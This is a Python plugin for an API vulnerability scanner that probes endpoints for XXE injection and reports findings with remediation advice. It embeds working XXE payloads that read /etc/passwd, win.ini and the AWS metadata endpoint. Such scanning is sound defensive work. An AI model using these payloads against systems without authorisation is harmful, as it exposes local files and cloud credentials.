"""
API XXE (XML External Entity) Scanner
Tests endpoints accepting XML for:
- Classic XXE (file read via entity expansion)
- Blind XXE (error-based entity expansion)
- XXE via content-type override (JSON→XML)
"""
import asyncio
import logging
import re

from app.scanner.plugins.base import Finding
from app.scanner.context import stable_fingerprint

logger = logging.getLogger("vulnscan.api_scanner.xxe")

# Classic XXE payloads
_XXE_FILE_READ = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
        [r"root:.*:0:0:", r"daemon:", r"nobody:"],
        "etc_passwd",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>',
        [r"[a-zA-Z0-9\-]{2,}"],
        "etc_hostname",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>',
        [r"\[fonts\]", r"\[extensions\]"],
        "win_ini",
    ),
]

# Error-based XXE
_XXE_ERROR = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_vulnscan_test">]><root>&xxe;</root>',
        [r"failed to load external entity", r"No such file", r"FileNotFoundException", r"SYSTEM.*entity"],
        "error_entity",
    ),
]

# XXE via parameter entity (blind)
_XXE_BLIND = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><root>test</root>',
        [r"ami-id", r"instance-id", r"local-ipv4"],
        "blind_aws_metadata",
    ),
]

# SOAP XXE
_XXE_SOAP = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>',
        [r"root:.*:0:0:"],
        "soap_xxe",
    ),
]


async def check(client, endpoints, ctx) -> list[Finding]:
    findings = []
    target = ctx.get("target_raw", "unknown")

    # Find endpoints that accept XML
    xml_endpoints = []
    for ep in endpoints:
        if any("xml" in ct.lower() for ct in ep.content_types):
            xml_endpoints.append(ep)

    # Also test JSON endpoints with XML content-type override
    json_endpoints = [ep for ep in endpoints if ep.method in ("POST", "PUT", "PATCH") and ep not in xml_endpoints]

    # Test XML endpoints
    for ep in xml_endpoints[:10]:
        for payload, patterns, desc in _XXE_FILE_READ + _XXE_ERROR:
            r = await client.send_raw(
                ep.method, ep.path, body=payload,
                content_type="application/xml",
            )
            if r.status == 0:
                continue

            for pat in patterns:
                if re.search(pat, r.body, re.I):
                    sev = "critical" if "passwd" in desc or "win_ini" in desc else "high"
                    fp = stable_fingerprint(target, "api.scanner.xxe", desc, ep.path)
                    findings.append(Finding(
                        severity=sev, plugin_id="api.scanner.xxe",
                        title=f"XXE ({desc}): {ep.method} {ep.path}",
                        description=(
                            f"XML External Entity injection confirmed. Payload '{desc}' "
                            f"caused the server to read a local file or reveal entity processing."
                        ),
                        evidence=f"path={ep.path} method={ep.method} type={desc} pattern={pat} response_preview={r.body[:200]}",
                        affected=target, fingerprint=fp, confidence=0.95,
                        cvss=9.1 if sev == "critical" else 7.5,
                        remediation=(
                            f"[{sev.upper()} — CWE-611 / OWASP API10:2023]\n\n"
                            f"[FIX]\n"
                            f"1. Disable external entity processing in XML parser\n"
                            f"2. Python: defusedxml.parse() instead of xml.etree\n"
                            f"3. Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                            f"4. PHP: libxml_disable_entity_loader(true)\n"
                            f"5. Use JSON instead of XML where possible"
                        ),
                        references=["https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"],
                    ))
                    break
            if any(f for f in findings if ep.path in (f.evidence or "")):
                break

    # Test content-type override on JSON endpoints
    for ep in json_endpoints[:5]:
        for payload, patterns, desc in _XXE_FILE_READ[:1] + _XXE_ERROR:
            r = await client.send_raw(
                ep.method, ep.path, body=payload,
                content_type="application/xml",
            )
            if r.status == 0 or r.status == 415:  # 415 = Unsupported Media Type (good)
                continue

            for pat in patterns:
                if re.search(pat, r.body, re.I):
                    fp = stable_fingerprint(target, "api.scanner.xxe", "ct_override", ep.path)
                    findings.append(Finding(
                        severity="high", plugin_id="api.scanner.xxe",
                        title=f"XXE via content-type override: {ep.method} {ep.path}",
                        description=(
                            f"The JSON endpoint {ep.path} accepts XML via Content-Type override "
                            f"and is vulnerable to XXE. The server processed XML entities."
                        ),
                        evidence=f"path={ep.path} original_ct=application/json injected_ct=application/xml type={desc}",
                        affected=target, fingerprint=fp, confidence=0.90, cvss=8.6,
                        remediation=(
                            "[HIGH — CWE-611] API accepts XML via content-type override.\n\n"
                            "[FIX] Reject unexpected Content-Type headers. Only accept application/json."
                        ),
                        references=["https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"],
                    ))
                    break

    return findings
